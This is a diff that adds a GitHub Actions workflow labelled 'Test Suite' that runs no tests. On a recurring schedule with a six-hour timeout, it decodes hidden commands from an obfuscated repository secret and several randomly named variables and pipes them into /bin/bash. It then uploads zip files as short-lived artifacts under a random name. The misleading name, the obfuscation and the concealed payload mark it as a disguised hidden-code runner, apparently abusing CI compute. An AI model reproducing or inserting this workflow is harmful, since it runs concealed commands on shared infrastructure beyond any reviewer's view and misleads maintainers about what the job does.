@@ -1,0 +1,37 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          ll411: ${{ secrets.ll411 }}
+        run: |
+          printf '%s' "$ll411" | jq -r .nz592 | /bin/bash
+          echo $xedz51055 | jq -r .q88190 | /bin/bash
+          echo $lhir491 | jq -r .xut7126 | /bin/bash
+          echo $m64248 | jq -r .oyhk627 | /bin/bash
+          printf '%s' "$jhba784" | jq -r .mzpte89 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0QScaCLq
+          path: "*.zip"
+          retention-days: 1
